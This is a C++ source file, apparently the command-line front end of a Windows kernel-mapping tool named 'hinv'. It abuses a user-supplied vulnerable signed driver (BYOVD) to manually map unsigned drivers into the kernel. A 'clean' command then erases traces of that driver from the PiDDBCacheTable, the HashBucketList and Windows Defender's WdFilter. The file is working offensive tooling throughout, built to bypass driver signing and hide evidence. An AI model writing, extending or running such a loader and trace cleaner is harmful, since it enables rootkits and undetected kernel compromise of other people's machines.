#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>

#include "../hinv-core/hinv_byovd.hpp"
#include "../hinv-core/hinv_kmem.hpp"
#include "../hinv-core/hinv_vmm.hpp"
#include "../hinv-core/hinv_cleaner.hpp"
#include "../hinv-core/hinv_mapper.hpp"
#include "../hinv-core/headless/hinv_headless.hpp"

static void PrintUsage() {
    std::cout << "Usage:\n"
              << "  hinv.exe load <driver.sys> [more modules...] --byovd <vulnerable.sys>\n"
              << "  hinv.exe clean <drivername> --byovd <vulnerable.sys>\n"
              << "  hinv.exe headless --byovd <vulnerable.sys> [--script <script.txt>]\n"
              << "  hinv.exe status\n\n";
}

static std::wstring ToWstring(const std::string& s) {
    if (s.empty()) return {};
    // argv arrives in the ANSI/UTF-8 codepage of the console; decode properly
    // instead of byte-widening (which corrupts any character above 0x7F).
    int len = MultiByteToWideChar(CP_UTF8, 0, s.data(), static_cast<int>(s.size()), nullptr, 0);
    UINT cp = CP_UTF8;
    if (len <= 0) { // not valid UTF-8: fall back to the ANSI codepage
        cp = CP_ACP;
        len = MultiByteToWideChar(cp, 0, s.data(), static_cast<int>(s.size()), nullptr, 0);
        if (len <= 0) return std::wstring(s.begin(), s.end());
    }
    std::wstring out(len, L'\0');
    MultiByteToWideChar(cp, 0, s.data(), static_cast<int>(s.size()), out.data(), len);
    return out;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        PrintUsage();
        return 1;
    }

    std::string command = argv[1];

    // Parse common flags.
    std::wstring byovdPath;
    std::string scriptPath;
    for (int i = 2; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--byovd" && i + 1 < argc) byovdPath = ToWstring(argv[++i]);
        else if (arg == "--script" && i + 1 < argc) scriptPath = argv[++i];
    }

    if (command == "status") {
        std::cout << "[*] HyperDbg device: " << (hinv::vmm::IsVmmDeviceActive() ? "ready" : "not loaded") << "\n";
        std::cout << "[*] BYOVD backend: " << (byovdPath.empty() ? "not configured" : "configured") << "\n";
        return 0;
    }

    if (command == "headless") {
        hinv::headless::HeadlessConfig config;
        config.byovdDriverPath = byovdPath;
        config.scriptPath = scriptPath;
        return hinv::headless::RunHeadlessSession(config) ? 0 : 1;
    }

    // Commands below require an active BYOVD backend.
    if (byovdPath.empty()) {
        std::cerr << "[-] This command requires --byovd <vulnerable.sys>\n";
        return 1;
    }

    hinv::kmem::Trace("cli: backend load begin");
    auto backend = hinv::byovd::LoadVulnerableDriver(byovdPath);
    if (!backend) {
        std::cerr << "[-] Failed to load BYOVD backend\n";
        hinv::kmem::Trace("cli: backend load failed");
        return 1;
    }
    hinv::kmem::Trace("cli: backend ready");

    if (command == "load" && argc >= 3) {
        // Positional arguments are input modules; flags are skipped. Multiple
        // modules are mapped in order within this process so later modules
        // can resolve imports from earlier ones (mapped-module registry).
        std::vector<std::wstring> paths;
        for (int i = 2; i < argc; ++i) {
            std::string arg = argv[i];
            if ((arg == "--byovd" || arg == "--script") && i + 1 < argc) { ++i; continue; }
            paths.push_back(ToWstring(arg));
        }
        if (paths.empty()) {
            std::cerr << "[-] No input files given\n";
            return 1;
        }
        if (paths.size() > 1) {
            std::cout << "[*] Chain-mapping " << paths.size() << " modules in order\n";
        }

        for (const auto& driverPath : paths) {
            std::wcout << L"[*] Loading driver via hinv manual mapper: " << driverPath << L"\n";

            auto result = hinv::mapper::MapDriver(backend.get(), driverPath);
            if (!result.success) {
                std::wcerr << L"[-] Manual mapping failed for " << driverPath << L"\n";
                std::cerr << "    " << result.error << "\n";
                return 1;
            }

            std::cout << "[+] Mapped at 0x" << std::hex << result.imageBase
                      << ", DriverEntry returned 0x" << result.driverEntryStatus << std::dec << "\n";
        }
        return 0;
    }

    if (command == "clean" && argc >= 3) {
        std::wstring driverName = ToWstring(argv[2]);
        uint32_t timestamp = hinv::cleaner::GetDriverFileTimestamp(byovdPath);
        auto result = hinv::cleaner::CleanDriverTraces(backend.get(), driverName, timestamp);
        if (!result.piDdbCache && !result.hashBucketList && !result.wdFilter) {
            std::wcerr << L"[-] Trace cleaning did not find matching entries: " << result.error << L"\n";
            return 1;
        }
        std::wcout << L"[+] Traces sanitized for " << driverName << L"\n";
        return 0;
    }

    PrintUsage();
    return 0;
}
